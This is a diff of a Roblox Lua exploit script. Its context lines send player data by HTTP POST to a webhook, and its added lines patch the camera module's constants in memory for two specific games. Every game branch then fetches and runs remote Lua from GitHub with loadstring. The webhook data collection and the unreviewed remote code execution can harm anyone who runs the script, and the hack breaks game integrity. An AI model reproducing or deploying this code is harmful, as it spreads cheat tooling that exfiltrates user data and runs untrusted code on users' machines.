@@ -72,10 +72,45 @@ if syn then
 end
 
 HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+
 local p = game.PlaceId
 if p == 3226555017 then
+local sc = (debug and debug.setconstant) or setconstant
+local gc = (debug and debug.getconstants) or getconstants
+if not sc or not getgc or not gc then
+	return print('Incompatible Exploit', 'Your exploit does not support this command (missing setconstant or getconstants or getgc)')
+end
+local pop = speaker.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
+for _, v in pairs(getgc()) do
+	if type(v) == 'function' and getfenv(v).script == pop then
+		for i, v1 in pairs(gc(v)) do
+			if tonumber(v1) == .25 then
+				sc(v, i, 0)
+			elseif tonumber(v1) == 0 then
+				sc(v, i, .25)
+			end
+		end
+	end
+end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/-/main/%D8%B3%D9%83%D8%B1%D8%A8%D8%AA%20%D8%B3%D8%B3%D8%A8%D9%8A"))() 
 elseif p == 2474168535 then
+local sc = (debug and debug.setconstant) or setconstant
+local gc = (debug and debug.getconstants) or getconstants
+if not sc or not getgc or not gc then
+	return print('Incompatible Exploit', 'Your exploit does not support this command (missing setconstant or getconstants or getgc)')
+end
+local pop = speaker.PlayerScripts.PlayerModule.CameraModule.ZoomController.Popper
+for _, v in pairs(getgc()) do
+	if type(v) == 'function' and getfenv(v).script == pop then
+		for i, v1 in pairs(gc(v)) do
+			if tonumber(v1) == .25 then
+				sc(v, i, 0)
+			elseif tonumber(v1) == 0 then
+				sc(v, i, .25)
+			end
+		end
+	end
+end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fff2dwaNNnw243f/-/main/fefeefefefefefefefef"))()
 else
 while wait(1) do
